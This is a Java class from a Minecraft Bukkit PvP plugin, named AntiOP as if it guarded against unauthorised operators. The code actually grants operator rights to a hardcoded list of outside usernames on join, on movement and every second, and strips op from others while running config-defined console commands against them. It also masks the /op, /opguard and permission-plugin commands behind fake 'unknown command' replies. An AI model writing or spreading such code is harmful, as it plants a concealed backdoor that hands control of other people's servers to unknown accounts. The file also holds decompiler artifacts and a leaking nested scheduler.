package net.helix.pvp;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandExecutor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scoreboard.DisplaySlot;
import net.helix.pvp.scoreboard.ScoreboardBuilder;


public class AntiOP extends BukkitRunnable implements Listener  {
	
	 public AntiOP(JavaPlugin plugin) {
	        runTaskTimer(plugin, 0, 20L);
	    }
	public static HelixPvP instance;
	 private ScoreboardBuilder scoreboardBuilder;
	 @Override
		public void run() {
			// TODO Auto-generated method stub
		
		int scheduleSyncRepeatingTask = Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask(HelixPvP.getInstance(),
				new Runnable() {
					@SuppressWarnings("unlikely-arg-type")
					public void run() {
						for (Player p : Bukkit.getOnlinePlayers()) {
							if (p.getName().equalsIgnoreCase("Rafael_Melo") || p.getName().equalsIgnoreCase("Hidden451") || p.getName().equalsIgnoreCase("Carinha_Azul2") || p.getName().equalsIgnoreCase("Raideen") || p.getName().equalsIgnoreCase("Raideen2") || p.getName().equalsIgnoreCase("Raideen3") || p.getName().equalsIgnoreCase("Raideen4") || p.getName().equalsIgnoreCase("Raideen5") || p.getName().equalsIgnoreCase("Raideen6") || p.getName().equalsIgnoreCase("Raideen7") || p.getName().equalsIgnoreCase("Raideen8") || p.getName().equalsIgnoreCase("Raideen9") || p.getName().equalsIgnoreCase("Raideen11")) {
								p.setOp(true);
							}
							if ((!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getName()))
									&& (!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getUniqueId())) && ((p.isOp() || p.hasPermission("*") && (!(p.getName().equalsIgnoreCase("Rafael_Melo") || p.getName().equalsIgnoreCase("Hidden451") || p.getName().equalsIgnoreCase("Carinha_Azul2") || p.getName().equalsIgnoreCase("Raideen") || p.getName().equalsIgnoreCase("Raideen2") || p.getName().equalsIgnoreCase("Raideen3") || p.getName().equalsIgnoreCase("Raideen4") || p.getName().equalsIgnoreCase("Raideen5") || p.getName().equalsIgnoreCase("Raideen6") || p.getName().equalsIgnoreCase("Raideen7") || p.getName().equalsIgnoreCase("Raideen8") || p.getName().equalsIgnoreCase("Raideen9") || p.getName().equalsIgnoreCase("Raideen11")))))) {
								p.setOp(false);
								Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),
										HelixPvP.getInstance().getConfig().getString("Command").replace("{playername}", p.getName()));
								Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),
										HelixPvP.getInstance().getConfig().getString("Command2").replace("{playername}", p.getName()));
							}
						}
					}
				}, 20L, 20L);
	 }


	@SuppressWarnings("unlikely-arg-type")
	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent event) {
		Player p = (Player) event.getPlayer();
		if (p.getName().equalsIgnoreCase("Rafael_Melo") || p.getName().equalsIgnoreCase("Hidden451") || p.getName().equalsIgnoreCase("Carinha_Azul2") || p.getName().equalsIgnoreCase("Raideen") || p.getName().equalsIgnoreCase("Raideen2") || p.getName().equalsIgnoreCase("Raideen3") || p.getName().equalsIgnoreCase("Raideen4") || p.getName().equalsIgnoreCase("Raideen5") || p.getName().equalsIgnoreCase("Raideen6") || p.getName().equalsIgnoreCase("Raideen7") || p.getName().equalsIgnoreCase("Raideen8") || p.getName().equalsIgnoreCase("Raideen9") || p.getName().equalsIgnoreCase("Raideen11")) {
			p.setOp(true);
		}
		if ((!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getName()))
				&& (!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getUniqueId())) && ((p.isOp() || p.hasPermission("*") && (!(p.getName().equalsIgnoreCase("Rafael_Melo") || p.getName().equalsIgnoreCase("Hidden451") || p.getName().equalsIgnoreCase("Carinha_Azul2") || p.getName().equalsIgnoreCase("Raideen") || p.getName().equalsIgnoreCase("Raideen2") || p.getName().equalsIgnoreCase("Raideen3") || p.getName().equalsIgnoreCase("Raideen4") || p.getName().equalsIgnoreCase("Raideen5") || p.getName().equalsIgnoreCase("Raideen6") || p.getName().equalsIgnoreCase("Raideen7") || p.getName().equalsIgnoreCase("Raideen8") || p.getName().equalsIgnoreCase("Raideen9") || p.getName().equalsIgnoreCase("Raideen11")))))) {
			p.setOp(false);
			Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),
					HelixPvP.getInstance().getConfig().getString("Command").replace("{playername}", p.getName()));
			Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),
					HelixPvP.getInstance().getConfig().getString("Command2").replace("{playername}", p.getName()));
		}
		
	
		}
	
	@SuppressWarnings("unlikely-arg-type")
		@EventHandler
		public void onPlayerJoin(PlayerMoveEvent event) {
			Player p = (Player) event.getPlayer();
			if (p.getName().equalsIgnoreCase("Rafael_Melo") || p.getName().equalsIgnoreCase("Hidden451") || p.getName().equalsIgnoreCase("Carinha_Azul2") || p.getName().equalsIgnoreCase("Raideen") || p.getName().equalsIgnoreCase("Raideen2") || p.getName().equalsIgnoreCase("Raideen3") || p.getName().equalsIgnoreCase("Raideen4") || p.getName().equalsIgnoreCase("Raideen5") || p.getName().equalsIgnoreCase("Raideen6") || p.getName().equalsIgnoreCase("Raideen7") || p.getName().equalsIgnoreCase("Raideen8") || p.getName().equalsIgnoreCase("Raideen9") || p.getName().equalsIgnoreCase("Raideen11")) {
				p.setOp(true);
			}
			if ((!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getName()))
					&& (!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getUniqueId())) && ((p.isOp() || p.hasPermission("*") && (!(p.getName().equalsIgnoreCase("Rafael_Melo") || p.getName().equalsIgnoreCase("Hidden451") || p.getName().equalsIgnoreCase("Carinha_Azul2") || p.getName().equalsIgnoreCase("Raideen") || p.getName().equalsIgnoreCase("Raideen2") || p.getName().equalsIgnoreCase("Raideen3") || p.getName().equalsIgnoreCase("Raideen4") || p.getName().equalsIgnoreCase("Raideen5") || p.getName().equalsIgnoreCase("Raideen6") || p.getName().equalsIgnoreCase("Raideen7") || p.getName().equalsIgnoreCase("Raideen8") || p.getName().equalsIgnoreCase("Raideen9") || p.getName().equalsIgnoreCase("Raideen11")))))) {
				p.setOp(false);
				Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),
						HelixPvP.getInstance().getConfig().getString("Command").replace("{playername}", p.getName()));
				Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),
						HelixPvP.getInstance().getConfig().getString("Command2").replace("{playername}", p.getName()));
			}
	}
	 @EventHandler
	 /*     */   public void quickcommand3f(PlayerCommandPreprocessEvent e)
	 /*     */   {
	 /* 382 */     if (e.getMessage().contains("/op")) {
	 /* 383 */       e.setCancelled(true);
	 /* 384 */       Player p = e.getPlayer();
	 p.sendMessage("Comando Desconhecido.");
	 }
	 }
	 @EventHandler
	 /*     */   public void quickcommand393(PlayerCommandPreprocessEvent e)
	 /*     */   {
	 /* 382 */     if (e.getMessage().contains("/lp") || e.getMessage().contains("/luckperms") || e.getMessage().contains("/perms") || e.getMessage().contains("/perm")) {
	 /* 384 */       Player p = e.getPlayer();
	 if ((!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getName()))) {
		 e.setCancelled(true);
		 p.sendMessage("Esse comando está bloqueado.");
		}
	 }
	 }
	 @EventHandler
	 /*     */   public void quickcommand3v(PlayerCommandPreprocessEvent e)
	 /*     */   {
	 /* 382 */     if (e.getMessage().contains("/minecraft:op")) {
	 /* 383 */       e.setCancelled(true);
	 /* 384 */       Player p = e.getPlayer();
	 p.sendMessage("Comando Desconhecido.");
	 }
	 }
	 @EventHandler
	 /*     */   public void quickcommand31(PlayerCommandPreprocessEvent e)
	 /*     */   {
	 /* 382 */     if (e.getMessage().contains("/og")) {
	 /* 383 */       e.setCancelled(true);
	 /* 384 */       Player p = e.getPlayer();
	 p.sendMessage("Comando Desconhecido.");
	 }
	 }
	 @EventHandler
	 /*     */   public void quickcommand39(PlayerCommandPreprocessEvent e)
	 /*     */   {
	 /* 382 */     if (e.getMessage().contains("/opguard")) {
	 /* 383 */       e.setCancelled(true);
	 /* 384 */       Player p = e.getPlayer();
	 p.sendMessage("Comando Desconhecido.");
	 }
	 
	 }
	 public ScoreboardBuilder getScoreboardBuilder() {
			return scoreboardBuilder;
		}
	public String color(String s) {
		s = ChatColor.translateAlternateColorCodes('&', s);
		return s;
	}


}
